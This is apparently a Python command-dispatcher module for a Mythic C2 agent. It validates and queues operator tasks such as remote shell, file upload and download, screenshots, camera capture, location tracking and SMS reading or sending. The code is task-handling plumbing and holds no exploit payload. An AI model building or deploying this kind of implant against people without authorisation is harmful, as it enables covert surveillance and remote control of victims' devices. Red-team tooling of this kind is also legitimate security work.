
"""
Command Dispatcher Module for Mythic 3.3 Framework

This module handles command parsing with parameter validation, module invocation
with error handling, result aggregation and formatting, and progress reporting
for long-running tasks in compliance with Mythic framework standards.
"""

import json
import time
import asyncio
import threading
import traceback
from datetime import datetime
from typing import Dict, List, Any, Optional, Callable, Union
from enum import Enum
from dataclasses import dataclass
import concurrent.futures
from queue import Queue, Empty
import logging

from mythic_integration import MythicIntegration


class TaskStatus(Enum):
    """Task execution status enumeration"""
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"
    TIMEOUT = "timeout"


class TaskPriority(Enum):
    """Task priority enumeration"""
    LOW = 3
    MEDIUM = 2
    HIGH = 1
    CRITICAL = 0


@dataclass
class TaskResult:
    """Task execution result container"""
    task_id: str
    status: TaskStatus
    result: Any = None
    error: str = None
    error_code: int = None
    artifacts: List[Dict] = None
    execution_time: float = 0.0
    progress: int = 100
    module_name: str = None
    command: str = None
    timestamp: str = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()
        if self.artifacts is None:
            self.artifacts = []


class ParameterValidator:
    """Advanced parameter validation with schema support"""
    

    PARAMETER_SCHEMAS = {

        "download": {
            "path": {"type": str, "required": True, "max_length": 4096},
            "chunk_size": {"type": int, "default": 1024000, "min": 1024, "max": 10485760}
        },
        "upload": {
            "remote_path": {"type": str, "required": True, "max_length": 4096},
            "file_data": {"type": str, "required": True},
            "permissions": {"type": str, "default": "644", "pattern": r"^[0-7]{3,4}$"}
        },
        "ls": {
            "path": {"type": str, "default": ".", "max_length": 4096},
            "recursive": {"type": bool, "default": False},
            "show_hidden": {"type": bool, "default": False}
        },
        

        "shell": {
            "command": {"type": str, "required": True, "max_length": 8192},
            "timeout": {"type": int, "default": 30, "min": 1, "max": 300},
            "capture_output": {"type": bool, "default": True}
        },
        "ps": {
            "filter": {"type": str, "default": "", "max_length": 256},
            "full_info": {"type": bool, "default": False}
        },
        

        "screenshot": {
            "quality": {"type": int, "default": 80, "min": 1, "max": 100},
            "format": {"type": str, "default": "png", "choices": ["png", "jpg", "webp"]},
            "display_id": {"type": int, "default": 0, "min": 0, "max": 10}
        },
        "camera": {
            "camera_id": {"type": int, "default": 0, "min": 0, "max": 10},
            "duration": {"type": int, "default": 5, "min": 1, "max": 60},
            "quality": {"type": int, "default": 80, "min": 1, "max": 100}
        },
        "location": {
            "accuracy": {"type": str, "default": "high", "choices": ["low", "medium", "high"]},
            "timeout": {"type": int, "default": 30, "min": 5, "max": 120}
        },
        

        "sms": {
            "action": {"type": str, "required": True, "choices": ["list", "send", "read"]},
            "number": {"type": str, "pattern": r"^\+?[\d\-\s\(\)]+$"},
            "message": {"type": str, "max_length": 1000},
            "limit": {"type": int, "default": 100, "min": 1, "max": 1000}
        }
    }
    
    @staticmethod
    def validate_parameters(command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Validate and normalize command parameters
        
        Args:
            command: Command name
            parameters: Raw parameters
            
        Returns:
            Validated and normalized parameters
            
        Raises:
            ValueError: If validation fails
        """
        schema = ParameterValidator.PARAMETER_SCHEMAS.get(command, {})
        validated = {}
        errors = []
        

        for param_name, param_config in schema.items():
            param_type = param_config["type"]
            

            if param_config.get("required", False) and param_name not in parameters:
                errors.append(f"Missing required parameter: {param_name}")
                continue
            

            if param_name not in parameters:
                if "default" in param_config:
                    validated[param_name] = param_config["default"]
                continue
            
            value = parameters[param_name]
            

            if not isinstance(value, param_type):
                try:
                    if param_type == bool and isinstance(value, str):
                        value = value.lower() in ("true", "1", "yes", "on")
                    else:
                        value = param_type(value)
                except (ValueError, TypeError):
                    errors.append(f"Invalid type for {param_name}: expected {param_type.__name__}, got {type(value).__name__}")
                    continue
            

            if param_type == int:
                if "min" in param_config and value < param_config["min"]:
                    errors.append(f"{param_name} must be >= {param_config['min']}, got {value}")
                    continue
                if "max" in param_config and value > param_config["max"]:
                    errors.append(f"{param_name} must be <= {param_config['max']}, got {value}")
                    continue
            

            if param_type == str:
                if "max_length" in param_config and len(value) > param_config["max_length"]:
                    errors.append(f"{param_name} must be <= {param_config['max_length']} characters, got {len(value)}")
                    continue
                if "pattern" in param_config:
                    import re
                    if not re.match(param_config["pattern"], value):
                        errors.append(f"{param_name} does not match required pattern")
                        continue
            

            if "choices" in param_config and value not in param_config["choices"]:
                errors.append(f"Invalid choice for {param_name}: {value}. Must be one of {param_config['choices']}")
                continue
            
            validated[param_name] = value
        

        for param_name, value in parameters.items():
            if param_name not in validated:
                validated[param_name] = value
        
        if errors:
            raise ValueError(f"Parameter validation failed: {'; '.join(errors)}")
        
        return validated


class ModuleInvoker:
    """Handle module invocation with error handling and result formatting"""
    
    def __init__(self, agent_instance):
        self.agent = agent_instance
        self.loaded_modules = {}
        self.module_stats = {}
    
    def invoke_module(self, module_name: str, command: str, parameters: Dict[str, Any],
                     task_id: str = None) -> TaskResult:
        """Invoke a module command with error handling
        
        Args:
            module_name: Target module name
            command: Command to execute
            parameters: Command parameters
            task_id: Optional task identifier
            
        Returns:
            TaskResult with execution details
        """
        start_time = time.time()
        task_id = task_id or f"task_{int(time.time() * 1000)}"
        

        if module_name not in self.module_stats:
            self.module_stats[module_name] = {
                "total_calls": 0,
                "successful_calls": 0,
                "failed_calls": 0,
                "avg_execution_time": 0.0,
                "last_called": None
            }
        
        stats = self.module_stats[module_name]
        stats["total_calls"] += 1
        stats["last_called"] = datetime.now().isoformat()
        
        try:

            if module_name not in self.agent.modules:
                raise ValueError(f"Module '{module_name}' not loaded or available")
            
            module_instance = self.agent.modules[module_name]
            

            if not hasattr(module_instance, 'execute'):
                raise AttributeError(f"Module '{module_name}' does not have an 'execute' method")
            

            try:
                result = module_instance.execute(command, parameters)
                execution_time = time.time() - start_time
                

                stats["successful_calls"] += 1
                stats["avg_execution_time"] = (
                    (stats["avg_execution_time"] * (stats["successful_calls"] - 1) + execution_time) /
                    stats["successful_calls"]
                )
                

                formatted_result = self._format_module_result(result, command, execution_time)
                
                return TaskResult(
                    task_id=task_id,
                    status=TaskStatus.COMPLETED,
                    result=formatted_result,
                    execution_time=execution_time,
                    module_name=module_name,
                    command=command
                )
                
            except Exception as module_error:

                execution_time = time.time() - start_time
                stats["failed_calls"] += 1
                
                error_details = {
                    "module": module_name,
                    "command": command,
                    "error": str(module_error),
                    "error_type": type(module_error).__name__,
                    "execution_time": execution_time
                }
                
                return TaskResult(
                    task_id=task_id,
                    status=TaskStatus.FAILED,
                    error=str(module_error),
                    error_code=getattr(module_error, 'errno', None),
                    execution_time=execution_time,
                    module_name=module_name,
                    command=command,
                    result={"error_details": error_details}
                )
                
        except Exception as general_error:

            execution_time = time.time() - start_time
            stats["failed_calls"] += 1
            
            return TaskResult(
                task_id=task_id,
                status=TaskStatus.FAILED,
                error=str(general_error),
                execution_time=execution_time,
                module_name=module_name,
                command=command
            )
    
    def _format_module_result(self, result: Any, command: str, execution_time: float) -> Dict[str, Any]:
        """Format module result for consistent output
        
        Args:
            result: Raw module result
            command: Command that was executed
            execution_time: Time taken to execute
            
        Returns:
            Formatted result dictionary
        """
        formatted = {
            "command": command,
            "execution_time": round(execution_time, 3),
            "timestamp": datetime.now().isoformat()
        }
        

        if isinstance(result, dict):
            formatted.update(result)
        elif isinstance(result, (list, tuple)):
            formatted["data"] = list(result)
            formatted["count"] = len(result)
        elif isinstance(result, str):
            formatted["output"] = result
        else:
            formatted["value"] = result
        
        return formatted
    
    def get_module_stats(self, module_name: str = None) -> Dict[str, Any]:
        """Get module execution statistics
        
        Args:
            module_name: Specific module name, or None for all modules
            
        Returns:
            Module statistics
        """
        if module_name:
            return self.module_stats.get(module_name, {})
        return self.module_stats.copy()


class ProgressReporter:
    """Handle progress reporting for long-running tasks"""
    
    def __init__(self, mythic_integration: MythicIntegration):
        self.mythic_integration = mythic_integration
        self.active_tasks = {}
        self.progress_callbacks = {}
    
    def start_progress_tracking(self, task_id: str, estimated_duration: int = None) -> Callable:
        """Start tracking progress for a task
        
        Args:
            task_id: Task identifier
            estimated_duration: Estimated task duration in seconds
            
        Returns:
            Progress update function
        """
        self.active_tasks[task_id] = {
            "start_time": time.time(),
            "estimated_duration": estimated_duration,
            "last_progress": 0,
            "last_update": time.time(),
            "status_message": "Starting task..."
        }
        
        def update_progress(progress: int, message: str = None):
            """Update task progress
            
            Args:
                progress: Progress percentage (0-100)
                message: Optional status message
            """
            if task_id not in self.active_tasks:
                return
            
            current_time = time.time()
            task_info = self.active_tasks[task_id]
            

            task_info["last_progress"] = min(100, max(0, progress))
            task_info["last_update"] = current_time
            if message:
                task_info["status_message"] = message
            

            if task_info["estimated_duration"] and progress > 0:
                elapsed = current_time - task_info["start_time"]
                estimated_total = (elapsed / progress) * 100
                remaining = max(0, estimated_total - elapsed)
                task_info["estimated_remaining"] = remaining
            

            try:
                progress_response = self.mythic_integration.format_response(
                    task_id,
                    {
                        "progress": progress,
                        "message": task_info["status_message"],
                        "estimated_remaining": task_info.get("estimated_remaining")
                    },
                    response_type="progress"
                )
                


                if task_id not in self.progress_callbacks:
                    self.progress_callbacks[task_id] = []
                self.progress_callbacks[task_id].append(progress_response)
                
            except Exception as e:
                print(f"[!] Failed to send progress update for task {task_id}: {e}")
        
        return update_progress
    
    def finish_progress_tracking(self, task_id: str):
        """Finish progress tracking for a task
        
        Args:
            task_id: Task identifier
        """
        if task_id in self.active_tasks:
            del self.active_tasks[task_id]
        if task_id in self.progress_callbacks:
            del self.progress_callbacks[task_id]
    
    def get_progress_updates(self, task_id: str) -> List[Dict]:
        """Get progress updates for a task
        
        Args:
            task_id: Task identifier
            
        Returns:
            List of progress updates
        """
        return self.progress_callbacks.get(task_id, [])
    
    def get_active_tasks(self) -> Dict[str, Dict]:
        """Get all active tasks with progress info
        
        Returns:
            Dictionary of active tasks
        """
        return self.active_tasks.copy()


class TaskQueue:
    """Priority queue for task management"""
    
    def __init__(self, max_concurrent: int = 5):
        self.max_concurrent = max_concurrent
        self.high_priority_queue = Queue()
        self.medium_priority_queue = Queue()
        self.low_priority_queue = Queue()
        self.running_tasks = {}
        self.completed_tasks = {}
        self._lock = threading.Lock()
    
    def add_task(self, task_id: str, task_data: Dict, priority: TaskPriority = TaskPriority.MEDIUM):
        """Add task to queue
        
        Args:
            task_id: Task identifier
            task_data: Task data dictionary
            priority: Task priority
        """
        task_info = {
            "task_id": task_id,
            "task_data": task_data,
            "added_at": datetime.now().isoformat(),
            "priority": priority
        }
        
        if priority == TaskPriority.HIGH:
            self.high_priority_queue.put(task_info)
        elif priority == TaskPriority.MEDIUM:
            self.medium_priority_queue.put(task_info)
        else:
            self.low_priority_queue.put(task_info)
    
    def get_next_task(self, timeout: float = 1.0) -> Optional[Dict]:
        """Get next task from queue
        
        Args:
            timeout: Timeout for getting task
            
        Returns:
            Task info dictionary or None
        """

        with self._lock:
            if len(self.running_tasks) >= self.max_concurrent:
                return None
        

        for queue in [self.high_priority_queue, self.medium_priority_queue, self.low_priority_queue]:
            try:
                task_info = queue.get(timeout=timeout)
                with self._lock:
                    self.running_tasks[task_info["task_id"]] = task_info
                return task_info
            except Empty:
                continue
        
        return None
    
    def mark_task_completed(self, task_id: str, result: TaskResult):
        """Mark task as completed
        
        Args:
            task_id: Task identifier
            result: Task execution result
        """
        with self._lock:
            if task_id in self.running_tasks:
                task_info = self.running_tasks.pop(task_id)
                task_info["completed_at"] = datetime.now().isoformat()
                task_info["result"] = result
                self.completed_tasks[task_id] = task_info
    
    def get_queue_status(self) -> Dict[str, Any]:
        """Get queue status information
        
        Returns:
            Queue status dictionary
        """
        with self._lock:
            return {
                "running_tasks": len(self.running_tasks),
                "high_priority_pending": self.high_priority_queue.qsize(),
                "medium_priority_pending": self.medium_priority_queue.qsize(),
                "low_priority_pending": self.low_priority_queue.qsize(),
                "completed_tasks": len(self.completed_tasks),
                "max_concurrent": self.max_concurrent
            }


class CommandDispatcher:
    """Main command dispatcher with comprehensive task management"""
    
    def __init__(self, agent_instance, mythic_integration: MythicIntegration,
                 max_concurrent_tasks: int = 5):
        self.agent = agent_instance
        self.mythic_integration = mythic_integration
        

        self.parameter_validator = ParameterValidator()
        self.module_invoker = ModuleInvoker(agent_instance)
        self.progress_reporter = ProgressReporter(mythic_integration)
        self.task_queue = TaskQueue(max_concurrent_tasks)
        

        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_concurrent_tasks)
        self.running = False
        

        self.task_futures = {}
        

        self.logger = logging.getLogger(__name__)
    
    def start(self):
        """Start the command dispatcher"""
        self.running = True
        

        self.processing_thread = threading.Thread(target=self._process_tasks, daemon=True)
        self.processing_thread.start()
        
        self.logger.info("Command dispatcher started")
    
    def stop(self):
        """Stop the command dispatcher"""
        self.running = False
        

        for task_id, future in self.task_futures.items():
            if not future.done():
                future.cancel()
        

        self.executor.shutdown(wait=True)
        
        self.logger.info("Command dispatcher stopped")
    
    def dispatch_task(self, raw_task: Dict) -> str:
        """Dispatch a new task for execution
        
        Args:
            raw_task: Raw task from Mythic framework
            
        Returns:
            Task ID for tracking
        """
        try:

            processed_task = self.mythic_integration.process_task(raw_task)
            task_id = processed_task["task_id"]
            

            priority = TaskPriority.MEDIUM
            if processed_task.get("routing", {}).get("priority") == 1:
                priority = TaskPriority.HIGH
            elif processed_task.get("routing", {}).get("priority") == 3:
                priority = TaskPriority.LOW
            

            self.task_queue.add_task(task_id, processed_task, priority)
            
            self.logger.info(f"Task {task_id} queued for execution")
            return task_id
            
        except Exception as e:
            self.logger.error(f"Failed to dispatch task: {e}")

            task_id = raw_task.get("task_id", "unknown")
            error_response = self.mythic_integration.format_response(
                task_id, str(e), response_type="error"
            )
            return task_id
    
    def _process_tasks(self):
        """Main task processing loop"""
        while self.running:
            try:

                task_info = self.task_queue.get_next_task(timeout=1.0)
                if not task_info:
                    continue
                
                task_id = task_info["task_id"]
                task_data = task_info["task_data"]
                

                future = self.executor.submit(self._execute_task, task_data)
                self.task_futures[task_id] = future
                

                future.add_done_callback(
                    lambda f, tid=task_id: self._task_completed(tid, f)
                )
                
            except Exception as e:
                self.logger.error(f"Error in task processing loop: {e}")
    
    def _execute_task(self, task_data: Dict) -> TaskResult:
        """Execute a single task
        
        Args:
            task_data: Processed task data
            
        Returns:
            Task execution result
        """
        task_id = task_data["task_id"]
        command = task_data["command"]
        parameters = task_data.get("parameters", {})
        

        if command == "error":
            return TaskResult(
                task_id=task_id,
                status=TaskStatus.FAILED,
                error=task_data.get("error", "Unknown error"),
                command=command
            )
        
        try:

            routing = task_data.get("routing", {})
            estimated_duration = routing.get("estimated_duration", 0)
            
            progress_update = None
            if estimated_duration > 5:
                progress_update = self.progress_reporter.start_progress_tracking(
                    task_id, estimated_duration
                )
            

            try:
                validated_params = self.parameter_validator.validate_parameters(command, parameters)
            except ValueError as param_error:
                return TaskResult(
                    task_id=task_id,
                    status=TaskStatus.FAILED,
                    error=f"Parameter validation failed: {str(param_error)}",
                    command=command
                )
            

            target_module = routing.get("target_module", "system")
            

            if progress_update:
                progress_update(10, f"Executing {command} command...")
            

            result = self.module_invoker.invoke_module(
                target_module, command, validated_params, task_id
            )
            

            if progress_update:
                progress_update(90, "Finalizing results...")
            

            if result.result and isinstance(result.result, dict):
                result.result["routing_info"] = routing
            

            if progress_update:
                progress_update(100, "Task completed")
                self.progress_reporter.finish_progress_tracking(task_id)
            
            return result
            
        except Exception as e:

            self.logger.error(f"Unexpected error executing task {task_id}: {e}")
            
            return TaskResult(
                task_id=task_id,
                status=TaskStatus.FAILED,
                error=f"Unexpected error: {str(e)}",
                command=command,
                result={"traceback": traceback.format_exc()}
            )
    
    def _task_completed(self, task_id: str, future: concurrent.futures.Future):
        """Handle task completion
        
        Args:
            task_id: Task identifier
            future: Completed future
        """
        try:

            result = future.result()
            

            self.task_queue.mark_task_completed(task_id, result)
            

            if result.status == TaskStatus.COMPLETED:
                response = self.mythic_integration.format_response(
                    task_id, result.result, response_type="success"
                )
            else:
                response = self.mythic_integration.format_response(
                    task_id, result.error, response_type="error"
                )
            

            self._store_response(task_id, response)
            
        except Exception as e:
            self.logger.error(f"Error handling task completion for {task_id}: {e}")
        
        finally:

            if task_id in self.task_futures:
                del self.task_futures[task_id]
    
    def _store_response(self, task_id: str, response: Dict):
        """Store response for retrieval (placeholder for C2 communication)
        
        Args:
            task_id: Task identifier
            response: Formatted response
        """


        self.logger.info(f"Task {task_id} completed: {response['responses'][0]['status']}")
    
    def get_task_status(self, task_id: str) -> Optional[Dict]:
        """Get status of a specific task
        
        Args:
            task_id: Task identifier
            
        Returns:
            Task status dictionary or None
        """

        if task_id in self.task_futures:
            future = self.task_futures[task_id]
            return {
                "task_id": task_id,
                "status": "running" if not future.done() else "completing",
                "progress_updates": self.progress_reporter.get_progress_updates(task_id)
            }
        

        completed = self.task_queue.completed_tasks.get(task_id)
        if completed:
            return {
                "task_id": task_id,
                "status": completed["result"].status.value,
                "completed_at": completed["completed_at"],
                "execution_time": completed["result"].execution_time,
                "error": completed["result"].error
            }
        
        return None
    
    def get_dispatcher_status(self) -> Dict[str, Any]:
        """Get overall dispatcher status
        
        Returns:
            Dispatcher status information
        """
        queue_status = self.task_queue.get_queue_status()
        module_stats = self.module_invoker.get_module_stats()
        active_progress = self.progress_reporter.get_active_tasks()
        
        return {
            "running": self.running,
            "queue_status": queue_status,
            "module_statistics": module_stats,
            "active_progress_tracking": len(active_progress),
            "total_task_futures": len(self.task_futures),
            "mythic_integration": self.mythic_integration.get_status()
        }
